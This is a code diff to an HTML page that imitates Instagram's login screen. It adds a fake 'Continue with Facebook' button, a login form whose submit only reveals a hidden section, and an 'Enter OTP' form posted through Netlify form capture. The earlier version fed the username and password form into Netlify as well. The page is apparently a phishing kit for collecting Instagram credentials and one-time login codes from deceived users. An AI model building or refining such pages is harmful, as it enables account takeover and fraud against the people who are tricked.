@@ -12,26 +12,31 @@
 
 <body>
     <div id="wrapper">
-        <div class="main-content">
+        <!-- Login Section -->
+        <div class="main-content" id="loginSection">
             <!-- Instagram Logo -->
             <div class="header">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo">
             </div>
 
-            
+            <!-- Facebook Login Button -->
+            <div class="btn1">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yZ/r/t9zW8PWBnrV.png" alt="Facebook Logo" class="icon">
+                <input type="button" onclick='window.location ="error.html";' value="Continue with Facebook" class="btn2">
+            </div>
 
-         
+            <!-- OR Divider -->
+            <div class="divider">
+                <span class="line"></span>
+                <span class="or">OR</span>
+                <span class="line"></span>
+            </div>
 
             <!-- Login Form -->
             <div class="l-part">
-                <form name="contact" action="https://www.instagram.com/reel/DFPVc-Ph9gc/?igsh=MW52dmw4Y3g2dWNmaQ==" netlify>
-                    <input type="text" name="username" placeholder="Username" class="input-1" />
-
-                    <div class="overlap-text">
-                        <input type="password" name="password" placeholder="Password" class="input-2" />
-
-                    </div>
-
+                <form id="loginForm">
+                    <input type="text" name="username" placeholder="Phone number, username, or email" class="input-1" required>
+                    <input type="password" name="password" placeholder="Password" class="input-2" required>
                     <input type="submit" class="btn" value="Log In">
                 </form>
             </div>
@@ -40,6 +45,16 @@
             <div class="forgot-password">
                 <a href="error.html">Forgot password?</a>
             </div>
+        </div>
+
+        <!-- OTP Section (Hidden Initially) -->
+        <div id="otpSection" class="otp-section hidden">
+            <h3>Enter OTP</h3>
+            <p>We've sent a one-time password to your email.</p>
+            <form id="otpForm" name="otp" netlify>
+                <input type="text" name="otp" placeholder="Enter OTP" class="input-1" required>
+                <input type="submit" class="btn" value="Verify OTP">
+            </form>
         </div>
 
         <!-- Sign-Up Section -->
@@ -62,6 +77,15 @@
             </div>
         </div>
     </div>
+
+    <script>
+        // Simulate login and show OTP section
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            e.preventDefault(); // Prevent form submission
+            document.getElementById('loginSection').classList.add('hidden'); // Hide login section
+            document.getElementById('otpSection').classList.remove('hidden'); // Show OTP section
+        });
+    </script>
 </body>
 
 </html>
